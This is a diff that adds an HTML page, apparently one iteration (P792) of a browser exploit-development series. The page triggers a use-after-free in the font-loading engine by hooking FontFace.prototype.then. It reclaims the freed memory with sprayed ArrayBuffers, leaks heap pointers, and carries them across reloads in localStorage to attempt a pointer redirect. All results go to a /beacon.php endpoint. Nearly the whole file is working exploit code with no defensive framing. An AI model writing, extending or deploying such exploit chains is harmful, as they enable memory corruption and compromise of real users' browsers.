@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P792 — Cross-Boot Pointer Redirect</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P792 — Cross-Boot Pointer Redirect
+ *
+ * P791 showed: second UAF in same page doesn't reclaim. Fix:
+ * use localStorage to split across two boots.
+ *
+ * BOOT 1 (phase=leak): Zeroed UAF → leak q11, q13, full 24q
+ *   dump. Store addresses in localStorage. Auto-reload.
+ *
+ * BOOT 2 (phase=redirect): Read q11 from localStorage. Single
+ *   UAF with q1=q11. Full 24-qword dump. Compare vs boot 1.
+ *   Also test: does engine write DIFFERENT fields when q1 is
+ *   non-NULL? Report any new non-zero qwords.
+ *
+ * CRASH_CLASS: HIGH — pointer redirect
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P792-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P792-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase;
+  try {
+    phase = localStorage.getItem('p792_phase') || 'leak';
+  } catch(e){
+    phase = 'leak';
+  }
+
+  b('BOOT', 'phase=' + phase);
+  log('P792 — Cross-Boot Redirect — Phase: ' + phase + '\n');
+
+  if (phase === 'leak'){
+    doLeakPhase();
+  } else if (phase === 'redirect'){
+    doRedirectPhase();
+  } else if (phase === 'done'){
+    log('All phases complete. Check beacons for results.');
+    b('ALREADY-DONE', '');
+    try { localStorage.removeItem('p792_phase'); localStorage.removeItem('p792_q11');
+      localStorage.removeItem('p792_q13'); localStorage.removeItem('p792_baseline'); } catch(e){}
+  }
+}
+
+/* ============================================================
+ * PHASE 1: Leak — zeroed UAF, dump all 24 qwords
+ * ============================================================ */
+function doLeakPhase(){
+  log('Phase LEAK: zeroed UAF to capture baseline + addresses...');
+
+  /* Set phase to redirect BEFORE the UAF (crash safety) */
+  try { localStorage.setItem('p792_phase', 'redirect'); } catch(e){}
+
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f1, bb1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Find reclaimed AB (q0 must be 1 = engine refcount write) */
+    var best = -1;
+    for (var i = 0; i < abs.length; i++){
+      var v = new BigUint64Array(abs[i]);
+      if (v[0] === BigInt(1)){
+        best = i;
+        break;
+      }
+    }
+
+    if (best < 0){
+      b('LEAK-MISS', 'no_q0_eq_1');
+      log('LEAK MISS — no AB has q0=1. Retrying...');
+      /* Reset phase for retry */
+      try { localStorage.setItem('p792_phase', 'leak'); } catch(e){}
+      setTimeout(function(){ location.reload(); }, 300);
+      return;
+    }
+
+    var view = new BigUint64Array(abs[best]);
+    var q11 = view[11];
+    var q13 = view[13];
+
+    /* Dump all 24 qwords as baseline */
+    var baseline = [];
+    var parts = [];
+    for (var q = 0; q < 24; q++){
+      baseline.push(h16(view[q]));
+      if (view[q] !== BigInt(0)){
+        parts.push('q' + q + '=0x' + h16(view[q]));
+      }
+    }
+
+    b('LEAK-OK', 'q11=0x' + h16(q11) + '|q13=0x' + h16(q13) + '|hit=' + best);
+
+    /* Send full dump in chunks */
+    var chunk = '';
+    for (var i = 0; i < parts.length; i++){
+      if (chunk.length + parts[i].length > 600){
+        b('LEAK-DUMP', chunk);
+        chunk = '';
+      }
+      if (chunk.length > 0) chunk += '|';
+      chunk += parts[i];
+    }
+    if (chunk.length > 0) b('LEAK-DUMP', chunk);
+
+    log('LEAK HIT (AB #' + best + '):');
+    for (var q = 0; q < 24; q++){
+      if (view[q] !== BigInt(0)){
+        log('  q' + q + ' (+0x' + (q*8).toString(16) + ') = 0x' + h16(view[q]));
+      }
+    }
+
+    /* Store for next boot */
+    try {
+      localStorage.setItem('p792_q11', h16(q11));
+      localStorage.setItem('p792_q13', h16(q13));
+      localStorage.setItem('p792_baseline', baseline.join(','));
+    } catch(e){
+      b('STORAGE-ERR', e.message);
+    }
+
+    log('\nStored q11/q13. Reloading for redirect phase...');
+    setTimeout(function(){ location.reload(); }, 300);
+  }, 400);
+}
+
+/* ============================================================
+ * PHASE 2: Redirect — q1 = leaked q11, full dump + compare
+ * ============================================================ */
+function doRedirectPhase(){
+  var q11str, q13str, baselineStr;
+  try {
+    q11str = localStorage.getItem('p792_q11');
+    q13str = localStorage.getItem('p792_q13');
+    baselineStr = localStorage.getItem('p792_baseline');
+  } catch(e){}
+
+  if (!q11str){
+    b('REDIRECT-NO-DATA', '');
+    log('No leak data in localStorage. Resetting to leak phase.');
+    try { localStorage.setItem('p792_phase', 'leak'); } catch(e){}
+    setTimeout(function(){ location.reload(); }, 300);
+    return;
+  }
+
+  var q11val = BigInt('0x' + q11str);
+  var q13val = BigInt('0x' + q13str);
+  var baseline = baselineStr ? baselineStr.split(',') : [];
+
+  b('REDIRECT-START', 'q11=0x' + q11str + '|q13=0x' + q13str);
+  log('Phase REDIRECT: q1 = 0x' + q11str + ' (leaked q11)');
+
+  /* Mark done BEFORE the UAF (crash = we see it in beacons) */
+  try { localStorage.setItem('p792_phase', 'done'); } catch(e){}
+
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('f2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      /* Pre-fill: q1 = leaked q11 address. All else zeroed. */
+      for (var k = 0; k < 64; k++){
+        var ab = new ArrayBuffer(192);
+        var v = new BigUint64Array(ab);
+        v[1] = q11val;
+        abs.push(ab);
+      }
+
+      try { document.fonts.check('1em bb2'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f2, bb2', 'CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Find reclaimed AB: must have q0=1 AND q1=our value */
+    var best = -1;
+    for (var i = 0; i < abs.length; i++){
+      var v = new BigUint64Array(abs[i]);
+      if (v[0] === BigInt(1) && v[1] === q11val){
+        best = i;
+        break;
+      }
+    }
+
+    /* Fallback: just q0=1 */
+    if (best < 0){
+      for (var i = 0; i < abs.length; i++){
+        var v = new BigUint64Array(abs[i]);
+        if (v[0] === BigInt(1)){
+          best = i;
+          break;
+        }
+      }
+    }
+
+    if (best < 0){
+      b('REDIRECT-MISS', 'no_reclaim');
+      log('REDIRECT MISS — no AB has q0=1. The redirect crashed the engine.');
+      /* Check if any AB has our q1 but no q0 */
+      var prefillOnly = 0;
+      for (var i = 0; i < abs.length; i++){
+        var v = new BigUint64Array(abs[i]);
+        if (v[1] === q11val && v[0] === BigInt(0)) prefillOnly++;
+      }
+      b('REDIRECT-DIAG', 'prefill_only=' + prefillOnly);
+      return;
+    }
+
+    var view = new BigUint64Array(abs[best]);
+    var hadQ1 = (view[1] === q11val);
+
+    /* Full dump */
+    var parts = [];
+    var newFields = [];
+    for (var q = 0; q < 24; q++){
+      if (view[q] !== BigInt(0)){
+        parts.push('q' + q + '=0x' + h16(view[q]));
+      }
+      /* Compare against baseline */
+      if (q !== 1 && baseline.length > q){
+        var bv = BigInt('0x' + baseline[q]);
+        if (view[q] !== BigInt(0) && bv === BigInt(0)){
+          newFields.push('q' + q + '=0x' + h16(view[q]));
+        }
+      }
+    }
+
+    b('REDIRECT-HIT', 'hit=' + best + '|hadQ1=' + hadQ1 + '|nzQ=' + parts.length);
+
+    /* Dump in chunks */
+    var chunk = '';
+    for (var i = 0; i < parts.length; i++){
+      if (chunk.length + parts[i].length > 600){
+        b('REDIRECT-DUMP', chunk);
+        chunk = '';
+      }
+      if (chunk.length > 0) chunk += '|';
+      chunk += parts[i];
+    }
+    if (chunk.length > 0) b('REDIRECT-DUMP', chunk);
+
+    log('REDIRECT HIT (AB #' + best + ', hadQ1=' + hadQ1 + '):');
+    for (var q = 0; q < 24; q++){
+      if (view[q] !== BigInt(0)){
+        var marker = '';
+        if (q === 1) marker = ' ← OUR REDIRECT';
+        if (baseline.length > q && BigInt('0x' + baseline[q]) === BigInt(0) && view[q] !== BigInt(0)){
+          marker = ' ← NEW (not in baseline!)';
+        }
+        log('  q' + q + ' (+0x' + (q*8).toString(16) + ') = 0x' + h16(view[q]) + marker);
+      }
+    }
+
+    if (newFields.length > 0){
+      b('NEW-FIELDS', newFields.join('|'));
+      log('\n*** NEW FIELDS from redirect: ' + newFields.join(', '));
+    } else {
+      b('NO-NEW-FIELDS', 'redirect_same_as_baseline');
+      log('\nNo new fields — engine wrote same qwords with or without q1 redirect.');
+    }
+
+    b('DONE', 'complete');
+    log('\n=== P792 COMPLETE ===');
+  }, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P792 — Cross-Boot Redirect — Loading...</pre>
+</body>
+</html>
